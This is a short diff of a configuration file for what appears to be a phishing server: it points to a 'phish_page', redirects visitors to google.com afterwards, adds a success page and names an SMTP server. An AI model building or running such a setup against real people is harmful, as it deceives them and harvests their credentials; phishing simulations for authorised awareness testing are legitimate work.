@@ -2,14 +2,10 @@
 ip = "127.0.0.1"
 port = 8080
 
-# [routes]
-# submit = "/submit"
-# index = "/index"
-# image = "/image"
-
 [paths]
 phish_page = "./frontend/index.html"
 redirect_url = "https://google.com"
+success_page = "./frontend/success.html"
 
 [smtp]
 server = "smtp.126.com"
